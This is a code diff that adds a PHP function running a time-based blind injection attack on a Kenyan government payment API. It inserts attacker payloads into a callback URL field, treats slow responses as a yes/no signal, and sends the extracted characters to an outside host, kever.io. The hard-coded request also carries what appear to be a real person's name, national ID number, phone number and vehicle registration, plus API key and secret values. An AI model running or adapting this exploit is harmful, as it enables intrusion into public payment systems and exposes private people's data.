@@ -648,6 +648,100 @@ function pesaflow($injection, $i, $sleep_timer, $state)
     // ...
 }
 
+//kotnova.io function from the folder bcc
+function pesaflow_bcc($injection, $i, $sleep_timer, $state)
+{
+    $sleep_a = $sleep_timer + 1;
+    $sleep_b = $sleep_a * 1000;
+    // $curl = curl_init();
+    global $curl;
+    curl_setopt_array($curl, array(
+        CURLOPT_URL => 'https://pesaflow.ecitizen.go.ke/PaymentAPI/iframev2.1.php',
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_ENCODING => '',
+        CURLOPT_MAXREDIRS => 10,
+        CURLOPT_TIMEOUT => $sleep_a, // Set the cURL timeout to 5 seconds
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+        CURLOPT_CUSTOMREQUEST => 'POST',
+        CURLOPT_POSTFIELDS => "amountExpected=550&apiClientID=4&billDesc=Vehicle%20Inquiry&billRefNumber=TIMS-MVR-10374947&callBackURLOnFail=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpayFail.htm&callBackURLOnSuccess=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpaySuccess.htm%3ForderNo%3D10374947%26callBackURLOnSuccess%3D%252Fportal%252FpublicQuery%252Fvehicle%252FqueryVehicle.htm%253FregistrationNo%253DKAR040A&clientEmail=&clientIDNumber=30945371&clientMSISDN=%2B254793060164&clientName=TIMONA%20MBURU%20WAMBUI&currency=KES&key=6678979C75A70BDA85762F4D488AFB6F&notificationURL=https%3a%2f%2fukrzmi.com%2flab.php'%2b" . $injection . "%2b'&pictureURL=https%3A%2F%2Ftims.ntsa.go.ke%2Fimages%2FuserPay.png&secret=C26C64040DBEE49500013CBCFEC42541&secureHash=ZmRiODg0NDZhNDIwMzI1MDExZDM0Zjk4NjMzOTMwYmQ1MDlmNjUwMjA3MDQ0MmFkNjhmMDMyODM2YTlmYmMwMQ%3D%3D&serviceID=46",
+        CURLOPT_HTTPHEADER => array(
+            'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
+            'sec-ch-ua-mobile: ?0',
+            'sec-ch-ua-platform: "Windows"',
+            'DNT: 1',
+            'Upgrade-Insecure-Requests: 1',
+            'Content-Type: application/x-www-form-urlencoded',
+            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
+            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Sec-Fetch-Site: cross-site',
+            'Sec-Fetch-Mode: navigate',
+            'Sec-Fetch-Dest: iframe',
+            'host: pesaflow.ecitizen.go.ke'
+        ),
+    ));
+
+    // Set the cURL timeout
+    curl_setopt($curl, CURLOPT_TIMEOUT_MS, $sleep_b);
+
+    // Execute the cURL request
+    $response = curl_exec($curl);
+
+    // Check for cURL errors and the execution time
+    $curlError = curl_error($curl);
+    $curlInfo = curl_getinfo($curl);
+
+    // Close the cURL session
+    curl_close($curl);
+
+    $i = [
+        'message' => $i,
+    ];
+    // Check if the request timed out
+    if ($curlInfo['total_time'] >= 5) {
+        if ($state['id'] == 1) {
+            echo "result:" . $i['message'];
+            exit; // Terminate the script
+        } elseif ($state['id'] == 2) {
+            if (is_array($i)) {
+
+                $stateObject = base64_encode(json_encode($state));
+
+                if (!isset($state['statecode'])) {
+                    $stateCode = base64_encode(json_encode([$i['message']]));
+                } else {
+                    $stc_a = json_decode(base64_decode($state['statecode']), true);
+                    //$stc_a['statecode']
+                    array_push($stc_a, $i['message']);
+                    $stateCode = base64_encode(json_encode($stc_a));
+                    //$state['stateCode'] = '';
+                }
+                httpGet('https://kever.io/' . $state['page'], ['statecode' => $stateCode, 'stateobject' => $stateObject], ['Cookie: visitorId=2MmU0NDJjNzZkN2IxOTAxMzkxZjUz']);
+                //header('location: ' . $state['page'] . '?statecode=' . $stateCode . '&stateobject=' . $stateObject);
+                //echo "result:" . $i['message'];
+                exit; // Terminate the script
+            } else {
+                echo "Variable [i] should be an array with state 2!";
+                exit; // Terminate the script
+            }
+        } else {
+            echo "Unknown variable [i].Should be either 1[a string] or 2[an array]!";
+            exit; // Terminate the script
+        }
+    } else {
+        //echo "Script ended. Last parameter: " . $i.'<br/>';
+    }
+
+    // Handle other possible errors or process the response as needed
+    if ($curlError) {
+        echo "cURL Error: " . $curlError;
+        exit; // Terminate the script
+    }
+
+    // Process the response as needed
+    // ...
+}
+
 function kotnova($injection, $i, $sleep_timer, $state)
 {
     $injection = str_replace(' ', '%20', $injection);
